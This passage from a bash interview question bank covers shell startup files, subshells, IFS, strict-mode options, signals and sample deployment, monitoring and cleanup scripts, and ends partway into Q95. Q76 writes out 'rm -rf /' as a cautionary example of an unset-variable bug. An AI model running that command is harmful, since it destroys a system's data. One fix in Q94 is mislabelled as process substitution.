**Key takeaway:** To kill an entire pipeline or job, use `kill -- -PGID`; killing a process group leader alone does not kill its children.

</details>

📖 **Theory:** [process-groups](./04_functions/scope_and_return.md#scope-and-return-values-in-bash)


---

### Q73 · [Thinking] · `bash-profile-rc`

> **What is the difference between `.bashrc`, `.bash_profile`, `.profile`, and `.bash_logout`? When is each loaded?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Each file serves a different shell startup context. Mixing them up causes environment variables and aliases to appear or disappear unexpectedly.

**How to think through this:**
1. **`.bash_profile`** — loaded by bash for interactive **login** shells (SSH login, `su -`, macOS Terminal). Run once per login session. Set `PATH`, environment variables, and source `.bashrc` from here.
2. **`.bashrc`** — loaded by bash for interactive **non-login** shells (new terminal tabs, `bash` run inside a session). Run every time you open a new shell. Put aliases, functions, and prompt config here.
3. **`.profile`** — the POSIX-portable version of `.bash_profile`. Used when bash is not the shell, or when `.bash_profile` does not exist. Avoid bash-specific syntax here.
4. **`.bash_logout`** — executed when a login shell exits. Use it to clear the screen, remove temp files, or log session end.
5. **The common pattern:** `.bash_profile` sources `.bashrc` so that login shells also pick up aliases:
   ```
   [[ -f ~/.bashrc ]] && source ~/.bashrc
   ```

**Key takeaway:** Put environment variables in `.bash_profile`; put aliases and functions in `.bashrc`; source `.bashrc` from `.bash_profile` to keep both in sync.

</details>

📖 **Theory:** [bash-profile-rc](./01_shell_basics/first_script.md#your-first-shell-script)


---

### Q74 · [Thinking] · `completion-scripts`

> **What are bash completion scripts? How do you add tab-completion for a custom command?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Bash completion scripts register functions that bash calls when the user presses Tab, generating context-aware suggestions for command arguments.

**How to think through this:**
1. Bash uses the `complete` builtin to associate a completion function with a command name. When Tab is pressed, bash calls the function with context variables: `COMP_WORDS` (array of words on the line), `COMP_CWORD` (index of the current word), and expects the function to populate `COMPREPLY`.
2. **Minimal example for a custom command `mytool` with subcommands:**
   ```bash
   _mytool_completion() {
       local cur="${COMP_WORDS[COMP_CWORD]}"
       local commands="start stop status deploy"
       COMPREPLY=( $(compgen -W "$commands" -- "$cur") )
   }
   complete -F _mytool_completion mytool
   ```
3. `compgen -W "word list" -- "$cur"` filters the word list to those matching what the user has typed so far.
4. **To install:** source the file in `.bashrc`, or drop it in `/etc/bash_completion.d/` (Linux) or `$(brew --prefix)/etc/bash_completion.d/` (macOS with bash-completion).
5. Use `complete -F` for function-based completion, `complete -W` for a static word list, `complete -f` for filenames.

**Key takeaway:** Define a function that writes to `COMPREPLY`, then register it with `complete -F funcname commandname`.

</details>

📖 **Theory:** [completion-scripts](./01_shell_basics/first_script.md#your-first-shell-script)


---

### Q75 · [Thinking] · `advanced-parameter-expansion`

> **What do `${var^^}`, `${var,,}`, `${!prefix*}`, and `${!array[@]}` do?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
These are advanced parameter expansions for case conversion, prefix-based variable lookup, and array key enumeration.

**How to think through this:**
1. **`${var^^}`** — converts all characters in `var` to uppercase. `${var^}` (single caret) uppercases only the first character.
2. **`${var,,}`** — converts all characters in `var` to lowercase. `${var,}` (single comma) lowercases only the first character.
3. **`${!prefix*}`** — expands to the names of all variables whose names begin with `prefix`. This is indirection at the variable-name level, not variable-value level. Example: if `PROD_HOST`, `PROD_PORT` exist, `echo ${!PROD_*}` prints `PROD_HOST PROD_PORT`.
4. **`${!array[@]}`** — expands to all the **indices (keys)** of an array, not the values. For indexed arrays this is `0 1 2 ...`; for associative arrays this is the list of string keys. Used to iterate over an array while also needing the index:
   ```bash
   for i in "${!arr[@]}"; do echo "[$i] = ${arr[$i]}"; done
   ```

**Key takeaway:** `${var^^}` / `${var,,}` handle case conversion; `${!prefix*}` finds variable names by prefix; `${!arr[@]}` gives array indices/keys.

</details>

📖 **Theory:** [advanced-parameter-expansion](./02_variables_and_data/string_operations.md#string-operations-in-bash)


---

## 🔵 Tier 4 — Interview / Scenario

### Q76 · [Interview] · `explain-set-e`

> **Explain `set -e`, `set -u`, and `set -o pipefail` to a junior developer. Why do production scripts need all three?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
These three options form a safety net that makes scripts fail loudly instead of silently continuing after errors.

**How to think through this:**
1. **`set -e` (errexit)** — exits the script immediately when any command returns a non-zero exit code. Without it, bash happily continues after a failed `cp`, `mkdir`, or `curl`, leading to cascading failures that are hard to debug. Analogy: it is a circuit breaker for your script.
2. **`set -u` (nounset)** — treats unset variables as errors. Without it, `rm -rf $DIR/` where `DIR` is unset silently becomes `rm -rf /` — a catastrophic bug. With `set -u`, bash exits immediately and tells you which variable was unset.
3. **`set -o pipefail`** — makes a pipeline return the exit code of the first failed command, not just the last. Without it, `false | true` returns exit code 0 (success) because `true` ran last. With `pipefail`, it returns 1 from `false`. This matters for `cmd | grep pattern | wc -l` pipelines.
4. **Use together:** `set -euo pipefail` at the top of every production script. Some teams also add `set -x` (xtrace) in debug mode to print each command before execution.
5. **Caveat:** `set -e` has edge cases — it does not trigger inside `if` conditions, `while` conditions, or after `||` and `&&`. Know the exceptions.

**Key takeaway:** `set -euo pipefail` makes scripts fail fast and explicitly — always use it in production.

</details>

📖 **Theory:** [explain-set-e](./06_error_handling/exit_codes.md#exit-n-setting-your-scripts-exit-code)


---

### Q77 · [Interview] · `compare-bash-python`

> **When would you write a script in bash vs Python? What are the breaking points where bash becomes the wrong tool?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Bash excels at gluing Unix tools together; Python excels when logic, data structures, or reliability matter more than terseness.

**How to think through this:**
1. **Use bash when:**
   - The script is mostly invoking other programs (`git`, `curl`, `tar`, `rsync`)
   - The logic is simple: loop over files, check exit codes, move things around
   - Portability to minimal environments (Docker base images, CI runners) is required
   - The script is short-lived infrastructure glue (deploy hooks, cron jobs)
2. **Bash breaking points — switch to Python when:**
   - You need real data structures: dicts, nested lists, objects
   - You are parsing JSON, YAML, or XML (bash + `jq` is a smell for "use Python")
   - You need error handling with context, not just exit codes
   - The script exceeds ~100 lines and has multiple functions
   - You need unit tests
   - String manipulation becomes complex (no regex capture groups in bash)
   - You need HTTP clients, database connections, or API calls beyond simple `curl`
3. **Rule of thumb:** if you find yourself writing `awk` inside a `for` loop inside a subshell, stop and write Python.
4. **The pragmatic middle ground:** bash for the outer orchestration, Python for the logic-heavy inner steps.

**Key takeaway:** Bash is a process orchestrator, not a programming language — when your script needs real programming, use Python.

</details>

📖 **Theory:** [compare-bash-python](./08_real_world_scripts/deployment_scripts.md#deployment-scripts)


---

### Q78 · [Interview] · `explain-subshell`

> **Explain what a subshell is and why variable changes inside a subshell don't affect the parent. Give an example.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A subshell is a child process that inherits a copy of the parent shell's environment. Changes to the copy never propagate back.

**How to think through this:**
1. When bash encounters `(...)`, a pipeline, or command substitution `$(...)`, it forks a child process. The child gets a full copy of all variables, functions, and open file descriptors at the moment of forking.
2. The child modifies its own copy. The parent's memory is untouched. When the child exits, its state is gone.
3. Example:
   ```bash
   x=1
   (x=99; echo "child: $x")   # prints: child: 99
   echo "parent: $x"           # prints: parent: 1
   ```
4. **Common trap — the pipe subshell:** `echo "hello" | read line` does not set `line` in the parent because `read` runs in a subshell (the right side of the pipe). Fix: use process substitution `read line < <(echo "hello")` or `lastpipe` option (bash 4.2+).
5. **Common trap — while loop:** `cat file | while read line; do count=$((count+1)); done` — `count` resets to 0 after the loop because the while runs in a subshell.

**Key takeaway:** Any fork (pipe, `()`, `$()`) creates a subshell — variable changes inside never reach the parent shell.

</details>

📖 **Theory:** [explain-subshell](./04_functions/scope_and_return.md#subshell-scope-trap)


---

### Q79 · [Interview] · `compare-test-brackets`

> **Compare `[ ]`, `[[ ]]`, and `(( ))`. Which should you default to and why?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
They are three different constructs for three different purposes: POSIX tests, bash extended tests, and arithmetic evaluation.

**How to think through this:**
1. **`[ ]` (test builtin)** — POSIX-compatible. Works in `sh`, `dash`, `bash`. Requires quoting all variables to prevent word splitting. Does not support `&&`/`||` inside (use `-a`/`-o`). No regex. No glob matching. Use when writing portable `sh` scripts.
2. **`[[ ]]` (bash keyword)** — bash/zsh only. Prevents word splitting and glob expansion on variables — safer by default. Supports `&&`, `||`, `!` directly. Supports `=~` for regex and `==` for glob matching. String comparison works without quoting (though quoting is still good practice). **Default choice for bash scripts.**
3. **`(( ))` (arithmetic evaluation)** — for integer math and comparisons only. No strings. Returns exit code 0 if expression is non-zero (truthy), 1 if zero. Use `(( i++ ))`, `(( n > 10 ))`, `(( a == b ))`. Cleaner than `[ "$n" -gt 10 ]`.
4. **Summary:**
   - String tests → `[[ ]]`
   - Integer comparisons → `(( ))`
   - Portable POSIX scripts → `[ ]`

**Key takeaway:** Default to `[[ ]]` for string/file tests and `(( ))` for arithmetic — they are safer and more expressive than `[ ]` in bash.

</details>

📖 **Theory:** [compare-test-brackets](./03_control_flow/conditionals.md#file-test-operators)


---

### Q80 · [Interview] · `explain-ifs`

> **What is IFS? How does it affect word splitting? Give an example where changing IFS fixes a script bug.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
IFS (Internal Field Separator) is a special variable that defines which characters bash uses to split words during word splitting and `read`.

**How to think through this:**
1. Default IFS is space + tab + newline. After command substitution or variable expansion (unquoted), bash splits the result on any IFS character.
2. **Bug scenario:** You have a CSV line and want to read each field:
   ```bash
   line="alice,30,engineer"
   for field in $line; do echo "$field"; done
   # Prints: alice,30,engineer  (one word — no spaces to split on)
   ```
   Changing IFS fixes it:
   ```bash
   IFS=","
   for field in $line; do echo "$field"; done
   # Prints: alice / 30 / engineer
   ```
3. **IFS with `read`:** `IFS=: read -r user pw uid gid info home shell < /etc/passwd` splits the line on `:` directly into variables.
4. **Best practice:** Change IFS locally, not globally. Use `local IFS=","` inside a function, or save and restore: `old_IFS=$IFS; IFS=","; ...; IFS=$old_IFS`.
5. **`IFS= read -r line`** (empty IFS) disables all splitting and trims no whitespace — standard idiom for reading lines exactly as-is.

**Key takeaway:** IFS controls word splitting — set it locally when parsing delimited data, always restore it afterward.

</details>

📖 **Theory:** [explain-ifs](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q81 · [Design] · `scenario-deployment-script`

> **Write the structure (not full implementation) of a deployment script that: validates prerequisites, backs up the current version, deploys new code, runs health checks, and rolls back on failure.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
A production deployment script follows a linear pipeline with a rollback trap registered before any destructive action begins.

**How to think through this:**
1. Register a `trap` for rollback before doing anything irreversible — this ensures rollback fires even on unexpected exits.
2. Each phase is a function: keeps logic isolated and testable.
3. Health checks gate the final "success" state — the script must not exit 0 until health is confirmed.

```bash
#!/usr/bin/env bash
set -euo pipefail

DEPLOY_DIR="/opt/app"
BACKUP_DIR="/opt/app_backups/$(date +%Y%m%d_%H%M%S)"
RELEASE_ARTIFACT="${1:?Usage: deploy.sh <artifact>}"
ROLLED_BACK=false

rollback() {
    if [[ "$ROLLED_BACK" == false ]] && [[ -d "$BACKUP_DIR" ]]; then
        echo "Rolling back to $BACKUP_DIR..."
        rsync -a "$BACKUP_DIR/" "$DEPLOY_DIR/"
        ROLLED_BACK=true
    fi
}
trap rollback ERR EXIT

validate_prerequisites() {
    command -v rsync  || { echo "rsync not found"; exit 1; }
    [[ -f "$RELEASE_ARTIFACT" ]] || { echo "Artifact not found"; exit 1; }
    [[ -w "$DEPLOY_DIR" ]]       || { echo "Deploy dir not writable"; exit 1; }
}

backup_current() {
    mkdir -p "$BACKUP_DIR"
    rsync -a "$DEPLOY_DIR/" "$BACKUP_DIR/"
}

deploy_new_code() {
    tar -xzf "$RELEASE_ARTIFACT" -C "$DEPLOY_DIR"
    systemctl restart myapp
}

run_health_checks() {
    local retries=5
    for ((i=1; i<=retries; i++)); do
        curl -sf http://localhost:8080/health && return 0
        sleep "$((i * 2))"
    done
    return 1
}

validate_prerequisites
backup_current
deploy_new_code
run_health_checks
trap - ERR EXIT   # clear rollback trap — deployment succeeded
echo "Deployment complete."
```

**Key takeaway:** Register the rollback trap before the first destructive step, remove it only after confirmed success.

</details>

📖 **Theory:** [scenario-deployment-script](./08_real_world_scripts/deployment_scripts.md#deployment-scripts)


---

### Q82 · [Design] · `scenario-log-monitor`

> **Design a bash script that monitors a log file in real time, sends an alert when ERROR appears more than 5 times per minute, and avoids sending duplicate alerts.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Use `tail -f` to stream new lines, a rolling counter with a time window, and a cooldown flag to suppress duplicate alerts.

**How to think through this:**
1. `tail -F` (capital F) follows the file and handles rotation automatically.
2. Count errors in a sliding window by resetting the counter every 60 seconds.
3. Use a cooldown timestamp to prevent re-alerting within the same window.

```bash
#!/usr/bin/env bash
set -euo pipefail

LOG_FILE="${1:?Usage: monitor.sh <logfile>}"
THRESHOLD=5
WINDOW=60
COOLDOWN=60  # seconds before re-alerting

error_count=0
window_start=$(date +%s)
last_alert=0

send_alert() {
    local now; now=$(date +%s)
    if (( now - last_alert >= COOLDOWN )); then
        echo "[ALERT $(date)] ERROR threshold exceeded: $error_count errors in ${WINDOW}s" \
            | mail -s "Log Alert" ops@example.com
        last_alert=$now
    fi
}

tail -F "$LOG_FILE" | while IFS= read -r line; do
    now=$(date +%s)

    # Reset window if 60 seconds have passed
    if (( now - window_start >= WINDOW )); then
        error_count=0
        window_start=$now
    fi

    if [[ "$line" == *ERROR* ]]; then
        (( error_count++ ))
        if (( error_count > THRESHOLD )); then
            send_alert
        fi
    fi
done
```

**Key takeaway:** Combine `tail -F`, a time-window counter, and a cooldown gate to avoid alert storms from a single burst of errors.

</details>

📖 **Theory:** [scenario-log-monitor](./08_real_world_scripts/system_monitoring.md#the-hospital-monitoring-analogy)


---

### Q83 · [Design] · `scenario-parallel-downloads`

> **You need to download 500 files from a list. Write a bash script that downloads them 10 at a time in parallel and reports failures.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Use a job-slot pattern with `wait -n` (bash 4.3+) or a PID tracking array to maintain exactly N concurrent downloads.

**How to think through this:**
1. Read URLs from a file, launch up to 10 background jobs, wait for one slot to free before launching the next.
2. Track PIDs and their associated URLs to report failures accurately.

```bash
#!/usr/bin/env bash
set -uo pipefail

URL_FILE="${1:?Usage: download.sh <url-list>}"
MAX_JOBS=10
FAILED=()
declare -A PID_TO_URL

download_file() {
    local url="$1"
    local filename; filename=$(basename "$url")
    curl -sf -o "$filename" "$url"
}

wait_for_slot() {
    while (( ${#PID_TO_URL[@]} >= MAX_JOBS )); do
        for pid in "${!PID_TO_URL[@]}"; do
            if ! kill -0 "$pid" 2>/dev/null; then
                if ! wait "$pid"; then
                    FAILED+=("${PID_TO_URL[$pid]}")
                fi
                unset "PID_TO_URL[$pid]"
            fi
        done
        sleep 0.1
    done
}

while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    wait_for_slot
    download_file "$url" &
    PID_TO_URL[$!]="$url"
done < "$URL_FILE"

# Wait for remaining jobs
for pid in "${!PID_TO_URL[@]}"; do
    if ! wait "$pid"; then
        FAILED+=("${PID_TO_URL[$pid]}")
    fi
done

if (( ${#FAILED[@]} > 0 )); then
    echo "Failed downloads (${#FAILED[@]}):"
    printf '  %s\n' "${FAILED[@]}"
    exit 1
fi
echo "All downloads complete."
```

**Key takeaway:** Track background PIDs in an associative array to enforce parallelism limits and report per-URL failures.

</details>

📖 **Theory:** [scenario-parallel-downloads](./07_automation/scheduling.md#scheduling-beyond-cron)


---

### Q84 · [Design] · `scenario-config-management`

> **You have a template file with `{{VARIABLE}}` placeholders. Write a bash function that substitutes values from a config file.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Use `sed` to replace each `{{KEY}}` placeholder with its value, reading key-value pairs from a config file.

**How to think through this:**
1. The config file uses `KEY=value` format (same as shell variable assignments but read manually to avoid security risks of `source`).
2. Build a `sed` expression for each key-value pair and apply them all in one pass.

```bash
#!/usr/bin/env bash
set -euo pipefail

render_template() {
    local template="$1"   # path to template file
    local config="$2"     # path to config file (KEY=value per line)
    local output="$3"     # path to write rendered output

    local sed_args=()

    while IFS='=' read -r key value; do
        # Skip comments and blank lines
        [[ "$key" =~ ^[[:space:]]*# ]] && continue
        [[ -z "$key" ]] && continue

        # Strip surrounding whitespace
        key="${key// /}"
        # Escape any / in value for sed
        value="${value//\//\\/}"

        sed_args+=(-e "s/{{${key}}}/${value}/g")
    done < "$config"

    if (( ${#sed_args[@]} == 0 )); then
        cp "$template" "$output"
        return
    fi

    sed "${sed_args[@]}" "$template" > "$output"
}

# Usage:
# render_template app.conf.tmpl deploy.env app.conf
render_template "$@"
```

**Key takeaway:** Parse config files with `IFS='=' read` rather than `source` — sourcing arbitrary config files is a code injection risk.

</details>

📖 **Theory:** [scenario-config-management](./08_real_world_scripts/deployment_scripts.md#configuration)


---

### Q85 · [Design] · `scenario-cleanup-script`

> **Write a cleanup script that removes files older than 30 days from `/tmp/uploads`, logs what it deleted, and never removes files currently open by a process.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Use `find` for age filtering, `lsof` to check for open file handles, and a log file with timestamps.

**How to think through this:**
1. `find -mtime +30` finds files not modified in over 30 days.
2. Before deleting each file, check `lsof` to see if any process has it open.
3. Log each action with a timestamp for auditability.

```bash
#!/usr/bin/env bash
set -euo pipefail

UPLOAD_DIR="/tmp/uploads"
LOG_FILE="/var/log/upload_cleanup.log"
MAX_AGE_DAYS=30
DELETED=0
SKIPPED=0

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

is_file_open() {
    local file="$1"
    lsof -- "$file" &>/dev/null
}

log "Starting cleanup of $UPLOAD_DIR (files older than ${MAX_AGE_DAYS} days)"

while IFS= read -r -d '' file; do
    if is_file_open "$file"; then
        log "SKIP (open): $file"
        (( SKIPPED++ ))
        continue
    fi

    rm -f -- "$file"
    log "DELETED: $file"
    (( DELETED++ ))

done < <(find "$UPLOAD_DIR" -maxdepth 1 -type f -mtime "+${MAX_AGE_DAYS}" -print0)

log "Done. Deleted: $DELETED, Skipped (open): $SKIPPED"
```

**Key takeaway:** Always check `lsof` before deleting files in active upload directories — removing an open file causes data corruption for the writing process.

</details>

📖 **Theory:** [scenario-cleanup-script](./07_automation/cron_jobs.md#etccrondaily--------scripts-run-daily)


---

### Q86 · [Interview] · `compare-heredoc-herestring`

> **Compare heredoc and here-string. When is a here-string more readable?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Both are ways to pass input to a command without a file or pipe. Heredoc is for multi-line input; here-string is for single-line input.

**How to think through this:**
1. **Heredoc** (`<<EOF ... EOF`) — passes multiple lines of text to a command's stdin. The delimiter can be anything; quoting it (`<<'EOF'`) prevents variable expansion inside.
   ```bash
   cat <<EOF
   Host: $HOSTNAME
   Date: $(date)
   EOF
   ```
2. **Here-string** (`<<<`) — passes a single string to stdin. Equivalent to `echo "string" | command` but avoids a subshell (the command reads directly from the parent shell).
   ```bash
   read -r first last <<< "John Doe"
   grep "pattern" <<< "$variable"
   bc <<< "2 + 2"
   ```
3. **When here-string wins:**
   - Parsing a single variable: `read a b c <<< "$line"` is cleaner than `echo "$line" | read a b c` (which also has the subshell problem).
   - Feeding a short computed value: `base64 --decode <<< "$encoded"`.
   - One-liner math: `bc -l <<< "scale=4; $a / $b"`.
4. **Heredoc wins** when you have multiple lines or need to embed a block of text/config.

**Key takeaway:** Use here-string (`<<<`) for single-value stdin — it avoids an extra process and is more readable than a one-liner heredoc.

</details>

📖 **Theory:** [compare-heredoc-herestring](./05_input_output/pipes_and_redirection.md#compare-output-of-two-commands-diff-needs-files)


---

### Q87 · [Interview] · `compare-exec-source`

> **What is the difference between `exec ./script.sh`, `source ./script.sh`, and `./script.sh`?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
They differ in whether a new process is created and whether the script shares the current shell's state.

**How to think through this:**
1. **`./script.sh`** — forks a child process, then exec's the script interpreter. The script runs in its own shell. Variable changes and `cd` in the script do not affect the parent. The parent waits for the child and gets its exit code.
2. **`source ./script.sh`** (or `. ./script.sh`) — runs the script in the **current shell process** — no fork. The script can read and modify the parent's variables, change directory, define functions. This is how `.bashrc` and virtual environment activations work. If the script calls `exit`, it exits the current shell.
3. **`exec ./script.sh`** — replaces the current shell process with the new script. No fork — the current process is overwritten. There is no parent to return to. Used in entrypoint scripts: `exec "$@"` hands off to the main command so it receives signals directly and becomes PID 1 in containers.
4. **Memory aid:** `./` = child, `source` = same shell, `exec` = replace self.

**Key takeaway:** `source` shares state with the current shell; `exec` replaces the current shell; `./` runs in an isolated child — choose based on whether the script needs to modify the caller's environment.

</details>

📖 **Theory:** [compare-exec-source](./01_shell_basics/shebang_and_execution.md#shebang-lines-and-script-execution)


---

### Q88 · [Design] · `scenario-csv-processing`

> **You have a 10GB CSV file. Write a memory-efficient bash pipeline to extract column 3 where column 1 = "ACTIVE" and output sorted unique values.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Stream the file with `awk` — never load it into memory. One pass extracts and filters; `sort -u` deduplicates.

**How to think through this:**
1. Never use `cat file | ...` for large files — `awk` reads it directly.
2. `awk` processes one line at a time with constant memory regardless of file size.
3. `sort -u` sorts and deduplicates; for very large unique-value sets, consider `-T /fast-disk` to control temp file location.

```bash
awk -F',' '$1 == "ACTIVE" { print $3 }' data.csv | sort -u
```

For CSV with quoted fields containing commas, `awk` alone is insufficient. Use:

```bash
# Option 1: csvkit (install once, handles quoting correctly)
csvcut -c 1,3 data.csv | awk -F',' '$1 == "ACTIVE" { print $2 }' | sort -u

# Option 2: handle simple quoted CSVs with a more defensive awk
awk -F',' '
    NR == 1 { next }          # skip header
    $1 ~ /^"?ACTIVE"?$/ {    # match with or without quotes
        gsub(/"/, "", $3)     # strip quotes from field 3
        print $3
    }
' data.csv | sort -u
```

**Key takeaway:** For large files, stream with `awk -F','` — it processes line-by-line in O(1) memory; only sort accumulates data.

</details>

📖 **Theory:** [scenario-csv-processing](./08_real_world_scripts/system_monitoring.md#system-monitoring-script)


---

### Q89 · [Design] · `scenario-health-check`

> **Write a script that checks if a list of services is running and a list of URLs returns HTTP 200. Exit 1 if anything is down.**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Check each service with `systemctl is-active`, each URL with `curl -o /dev/null -w "%{http_code}"`, collect failures, and exit based on count.

```bash
#!/usr/bin/env bash
set -uo pipefail

SERVICES=(nginx postgresql redis)
URLS=(
    "http://localhost:8080/health"
    "http://localhost:9090/metrics"
)

FAILURES=0

check_service() {
    local svc="$1"
    if systemctl is-active --quiet "$svc"; then
        echo "  OK  service: $svc"
    else
        echo "  FAIL service: $svc (not active)"
        (( FAILURES++ ))
    fi
}

check_url() {
    local url="$1"
    local code
    code=$(curl -sf -o /dev/null -w "%{http_code}" --max-time 5 "$url" 2>/dev/null || true)
    if [[ "$code" == "200" ]]; then
        echo "  OK  url: $url"
    else
        echo "  FAIL url: $url (got HTTP ${code:-000})"
        (( FAILURES++ ))
    fi
}

echo "=== Service checks ==="
for svc in "${SERVICES[@]}"; do check_service "$svc"; done

echo "=== URL checks ==="
for url in "${URLS[@]}"; do check_url "$url"; done

echo ""
if (( FAILURES > 0 )); then
    echo "Health check FAILED: $FAILURES issue(s) found."
    exit 1
fi
echo "All checks passed."
```

**Key takeaway:** Collect all failures before exiting so a single run reveals every problem, not just the first one.

</details>

📖 **Theory:** [scenario-health-check](./08_real_world_scripts/system_monitoring.md#checks)


---

### Q90 · [Interview] · `compare-signals`

> **Explain SIGTERM vs SIGKILL vs SIGHUP in the context of service management. Which does `systemctl stop` send and in what order?**

<details>
<summary>💡 Show Answer</summary>

**Answer:**
Each signal has a different relationship with the target process: SIGTERM asks politely, SIGHUP reloads, SIGKILL forces.

**How to think through this:**
1. **SIGTERM (15)** — the default "please stop" signal. The process receives it and can catch it with a `trap`, clean up temp files, finish in-flight requests, and exit gracefully. A well-written service handles SIGTERM within a few seconds.
2. **SIGHUP (1)** — originally meant "terminal disconnected." For daemons (nginx, sshd), it conventionally means "reload your config without restarting." The process catches SIGHUP and re-reads its config file in place. Behavior is process-defined — not all services implement it.
3. **SIGKILL (9)** — the unconditional kill. Sent by the kernel, cannot be caught or ignored. The process is terminated immediately by the OS with no cleanup. Open files may not be flushed, temp files left behind. Use only as a last resort.
4. **`systemctl stop` sequence:**
   - Sends **SIGTERM** to the main process (and optionally the whole cgroup).
   - Waits up to `TimeoutStopSec` (default 90 seconds) for the process to exit.
   - If the process is still running after the timeout, sends **SIGKILL**.
5. `systemctl reload` sends SIGHUP (or a service-defined reload signal).
6. `kill -9` is the manual SIGKILL — only when SIGTERM fails.

**Key takeaway:** `systemctl stop` is SIGTERM first, SIGKILL after timeout — write services with a SIGTERM handler so they never need SIGKILL.

</details>

📖 **Theory:** [compare-signals](./06_error_handling/traps.md#multiple-signals)


---

## 🔴 Tier 5 — Critical Thinking

### Q91 · [Logical] · `predict-quoting`

> **Predict the output of each of the following:**

```bash
x="hello world"
echo $x
echo "$x"
for word in $x; do echo $word; done
for word in "$x"; do echo $word; done
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```
hello world
hello world
hello
world
hello world
```

**How to think through this:**
1. **`echo $x`** — unquoted. Word splitting splits `hello world` into two arguments. `echo` receives two arguments and prints them separated by a space: `hello world`. Output looks the same here, but with more spaces it would differ.
2. **`echo "$x"`** — quoted. No word splitting. `echo` receives one argument `hello world`. Output: `hello world`. Identical here but the mechanism differs.
3. **`for word in $x`** — unquoted. Word splitting produces two words: `hello` and `world`. Loop iterates twice, printing each on its own line.
4. **`for word in "$x"`** — quoted. No splitting. The loop iterates once with `word="hello world"`, printing `hello world` on one line.

**Key takeaway:** Quoting prevents word splitting — the difference between `$x` and `"$x"` in a loop determines whether you iterate over words or the whole string.

</details>

📖 **Theory:** [predict-quoting](./02_variables_and_data/variables.md#variables-and-data-in-bash)


---

### Q92 · [Logical] · `predict-set-e`

> **With `set -e`, predict which line causes the script to exit:**

```bash
set -e
grep "foo" nonexistent.txt
echo "still running"
[ -f nonexistent.txt ] && echo "exists"
echo "done"
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
The script exits at line 2: `grep "foo" nonexistent.txt`.

**How to think through this:**
1. `set -e` exits on any command that returns non-zero.
2. **Line 2:** `grep` on a nonexistent file returns exit code 2 (file not found error). `set -e` triggers — script exits immediately. Nothing after this runs.
3. **Line 3** (`echo "still running"`) — never reached.
4. **Line 4** (`[ -f nonexistent.txt ] && echo "exists"`) — would NOT trigger `set -e` even if reached. Commands after `&&` and `||` are exempt from `set -e`; the compound expression is treated as one conditional.
5. **Line 5** (`echo "done"`) — never reached.
6. **Important nuance:** If line 2 were `grep "foo" file.txt` where the file exists but pattern is not found, grep returns exit code 1 (no match) — also triggers `set -e`.

**Key takeaway:** `set -e` exits on the first failing command; commands in `&&`/`||` chains and `if` conditions are exempt from this rule.

</details>

📖 **Theory:** [predict-set-e](./06_error_handling/exit_codes.md#exit-n-setting-your-scripts-exit-code)


---

### Q93 · [Logical] · `predict-subshell-var`

> **Predict the output:**

```bash
x=1
(x=2; echo "inside: $x")
echo "outside: $x"
x=3 command_that_doesnt_exist
echo "after: $x"
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**

```
inside: 2
outside: 1
[error: command_that_doesnt_exist not found]
after: 1
```

**How to think through this:**
1. **Line 1:** `x=1` — set in parent shell.
2. **Line 2:** `(x=2; ...)` — runs in a subshell. `x=2` modifies only the subshell's copy. Prints `inside: 2`. Parent's `x` is unchanged.
3. **Line 3:** `echo "outside: $x"` — parent's `x` is still 1. Prints `outside: 1`.
4. **Line 4:** `x=3 command_that_doesnt_exist` — this is a **temporary environment assignment**. `x=3` is set only for the duration of that command's execution, not in the parent shell. The command fails with "not found." Crucially, `x` in the parent shell is never set to 3.
5. **Line 5:** `echo "after: $x"` — parent's `x` is still 1. Prints `after: 1`. (Assuming `set -e` is not active; with `set -e` the script would exit at line 4.)

**Key takeaway:** `VAR=value command` is a temporary export for that command only — it never modifies the calling shell's variable.

</details>

📖 **Theory:** [predict-subshell-var](./04_functions/scope_and_return.md#variable-scope-in-detail)


---

### Q94 · [Debug] · `debug-while-pipe`

> **This script always prints `Count: 0` instead of the actual count. Find the bug and fix it:**

```bash
count=0
cat file.txt | while read line; do
    count=$((count + 1))
done
echo "Count: $count"
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
The bug is that the `while` loop runs in a subshell (the right side of the pipe), so `count` increments only in the subshell and the parent never sees it.

**How to think through this:**
1. In bash, each side of a pipe runs in a subshell. The `while read` loop has its own copy of `count`. It increments to the correct value inside the subshell.
2. When the subshell exits, its state (including `count`) is discarded. The parent shell's `count` is still 0.
3. **Fix 1 — process substitution (preferred):**
   ```bash
   count=0
   while IFS= read -r line; do
       count=$((count + 1))
   done < file.txt
   echo "Count: $count"
   ```
   Reading from a file redirect does not create a subshell for the while loop.
4. **Fix 2 — process substitution with command:**
   ```bash
   count=0
   while IFS= read -r line; do
       count=$((count + 1))
   done < <(grep "pattern" file.txt)
   echo "Count: $count"
   ```
5. **Fix 3 — `lastpipe` option (bash 4.2+):** `shopt -s lastpipe` makes the last segment of a pipeline run in the current shell. Less portable.

**Key takeaway:** Never rely on variables set inside a pipe's while loop — use `< file` or `< <(cmd)` redirects so the loop runs in the current shell.

</details>

📖 **Theory:** [debug-while-pipe](./05_input_output/pipes_and_redirection.md#with-pipe-while-runs-in-a-subshell--count-is-lost-after-loop)


---

### Q95 · [Debug] · `debug-glob-expand`

> **This script fails when a directory is empty. Find the bug:**

```bash
set -e
for file in /tmp/logs/*.log; do
    process "$file"
done
```

<details>
<summary>💡 Show Answer</summary>

**Answer:**
